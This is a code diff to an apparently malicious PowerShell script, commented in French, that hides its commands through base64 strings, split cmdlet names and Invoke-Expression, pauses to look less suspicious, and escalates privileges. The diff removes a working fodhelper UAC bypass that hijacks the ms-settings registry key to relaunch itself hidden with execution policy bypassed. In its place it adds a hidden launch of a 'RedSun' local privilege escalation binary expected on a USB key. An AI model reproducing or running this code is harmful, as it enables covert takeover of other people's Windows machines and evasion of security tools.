@@ -7,6 +7,7 @@
 #   - Invocation de commandes via iex (Invoke-Expression)
 #   - Substitution des cmdlets par des alias et méthodes .NET
 #   - Découpage des noms de propriétés
+# Élévation : RedSun LPE (remplace fodhelper)
 # ==============================================================
 
 $ErrorActionPreference = [System.Management.Automation.ActionPreference]::SilentlyContinue
@@ -47,24 +48,18 @@ if ($_r -and $_r -lt 2147483648) { exit }
 # Pause initiale (comportement moins suspect)
 &(g1 "Start-" "Sleep") -Milliseconds 600
 
-# ── Vérification / élévation des droits ──────────────────────
+# ── Vérification / élévation des droits (RedSun LPE) ─────────
 
 $_ia = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()) `
         .IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $_ia) {
-    # UAC bypass : fodhelper
-    $_sp  = $MyInvocation.MyCommand.Path
-    $_cmd = (g0 "cG93ZXJzaGVsbC5leGU=") + # powershell.exe
-            " -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -NoProfile -File `"$_sp`""
-    $_rp  = (g0 "SEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xzaGVsbFxvcGVuXGNvbW1hbmQ=")
-    # HKCU:\Software\Classes\ms-settings\shell\open\command
-    $null = &(g1 "New-" "Item")         -Path $_rp -Force
-    $null = &(g1 "New-ItemPro" "perty") -Path $_rp -Name (g0 "RGVsZWdhdGVFeGVjdXRl") -Value "" -Force
-    $null = &(g1 "Set-ItemPro" "perty") -Path $_rp -Name "(default)" -Value $_cmd -Force
-    &(g1 "Start-" "Process") "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-    &(g1 "Start-" "Sleep") -Seconds 3
-    $null = &(g1 "Remove-" "Item") (g0 "SEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5ncw==") -Recurse -Force
+    # Élévation via RedSun (LPE) – RedSun.exe doit être à la racine de la clé USB
+    $_rse = &(g1 "Join-" "Path") $PSScriptRoot (g0 "UmVkU3VuLmV4ZQ==")  # RedSun.exe
+    if (&(g1 "Test-" "Path") $_rse) {
+        &(g1 "Start-" "Process") -FilePath $_rse -WindowStyle Hidden
+        &(g1 "Start-" "Sleep") -Seconds 5
+    }
     exit
 }
 
